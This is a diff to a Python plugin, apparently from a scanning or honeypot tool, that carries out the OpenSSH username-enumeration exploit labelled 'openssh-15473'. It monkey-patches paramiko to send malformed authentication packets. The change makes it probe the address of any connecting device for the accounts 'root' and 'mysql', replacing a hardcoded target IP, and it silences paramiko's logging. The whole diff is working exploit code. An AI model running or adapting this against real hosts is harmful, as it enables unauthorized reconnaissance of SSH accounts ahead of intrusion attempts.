@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python3 -W ignore::DeprecationWarning
 # -*- coding: utf-8 -*-
 
 """
@@ -18,6 +18,7 @@ import socket
 import logging as log
 from .IPlugin import IPlugin, connection_type
 
+log.getLogger("paramiko").setLevel(log.CRITICAL)
 old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
 class BadUsername(Exception):
@@ -37,9 +38,9 @@ def malform_packet(*args, **kwargs):
     paramiko.message.Message.add_boolean = old_add_boolean
     return result
 
-def checkUsername(username, tried=0):
+def checkUsername(ip, username, tried=0):
 	sock = socket.socket()
-	sock.connect(('51.38.179.48', 22))
+	sock.connect(ip)
 	transport = paramiko.transport.Transport(sock)
 	try:
 	    transport.start_client()
@@ -47,16 +48,17 @@ def checkUsername(username, tried=0):
 	    transport.close()
 	    if tried < 4:
 	    	tried += 1
-	    	return checkUsername(username, tried)
+	    	return checkUsername(ip, username, tried)
 	    else:
-	    	print ('[-] Failed to negotiate SSH transport')
+	    	log.info("plugin=openssh-15473 error=failed_to_connect")
 	try:
 		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
 	except BadUsername:
     		return (username, False)
 	except paramiko.ssh_exception.AuthenticationException:
     		return (username, True)
-	raise Exception("Error ??? CheckUsername")
+	log.debug("plugin=openssh-15473 error=???")
+	return
 
 paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
 paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
@@ -71,6 +73,10 @@ class Plugin(IPlugin):
 		pass
 
 	def exec(self, socket):
-		res = checkUsername("root")
-		log.info("plugin=openssh-15473 device={} username={} valid={}".format(socket.getpeername()[0], res[0], res[1]))
-		pass
+		rip = socket.getpeername()
+		res = checkUsername(rip, "root")
+		if res[1]:
+			log.info("plugin=openssh-15473 device={} username={} valid={}".format(socket.getpeername()[0], res[0], res[1]))
+		res = checkUsername(rip, "mysql")
+		if res[1]:
+			log.info("plugin=openssh-15473 device={} username={} valid={}".format(socket.getpeername()[0], res[0], res[1]))
